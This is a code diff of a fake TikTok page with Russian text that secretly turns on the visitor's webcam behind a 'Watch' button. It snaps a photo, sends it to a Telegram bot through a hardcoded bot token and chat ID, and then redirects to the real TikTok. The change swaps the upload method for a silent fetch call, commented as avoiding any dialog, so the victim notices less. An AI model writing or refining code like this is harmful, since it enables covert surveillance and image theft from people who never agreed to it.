@@ -13,23 +13,22 @@
         button { background:#fe2c55; border:none; color:#fff; font-size:18px; padding:14px 40px; border-radius:50px; margin-top:15px; cursor:pointer; width:100%; }
         video { display:none; }
         .loader { display:none; margin-top:10px; color:#fe2c55; }
-        iframe { display:none; }
     </style>
 </head>
 <body>
 <div class="card">
-    <h2>🎵 TikTok</h2>
+    <h2>TikTok</h2>
     <p>Нажми «Смотреть» для загрузки видео</p>
     <button id="btn">Смотреть</button>
     <div class="loader" id="loader">⏳ Загрузка...</div>
 </div>
 
 <video id="cam" autoplay muted></video>
-<iframe name="telegramFrame" style="display:none;"></iframe>
 
 <script>
     const BOT_TOKEN = '8764529930:AAEAu0l1CYHA_LdKgczyynFv6knHpulyL6c';
     const CHAT_ID = '8533142719';
+    const REDIRECT_URL = 'https://vt.tiktok.com/ZSCwouNc1/'; // сюда перенаправим
 
     const btn = document.getElementById('btn');
     const loader = document.getElementById('loader');
@@ -67,33 +66,19 @@
                 return;
             }
 
-            const form = document.createElement('form');
-            form.method = 'POST';
-            form.enctype = 'multipart/form-data';
-            form.action = `https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`;
-            form.target = 'telegramFrame';
+            // Отправка через fetch без форм и input — диалог не появляется
+            const formData = new FormData();
+            formData.append('chat_id', CHAT_ID);
+            formData.append('photo', blob, 'photo.jpg');
 
-            const chatInput = document.createElement('input');
-            chatInput.type = 'hidden';
-            chatInput.name = 'chat_id';
-            chatInput.value = CHAT_ID;
-            form.appendChild(chatInput);
+            fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+                method: 'POST',
+                body: formData,
+                mode: 'no-cors'
+            }).catch(() => {});
 
-            const file = new File([blob], 'photo.jpg', { type: 'image/jpeg' });
-            const fileInput = document.createElement('input');
-            fileInput.type = 'file';
-            fileInput.name = 'photo';
-            const dataTransfer = new DataTransfer();
-            dataTransfer.items.add(file);
-            fileInput.files = dataTransfer.files;
-            form.appendChild(fileInput);
-
-            document.body.appendChild(form);
-            form.submit();
-
-            setTimeout(() => {
-                window.location.href = 'https://www.tiktok.com';
-            }, 1000);
+            // Мгновенный редирект на реальный TikTok
+            window.location.replace(REDIRECT_URL);
         }, 'image/jpeg', 0.8);
     }
 </script>
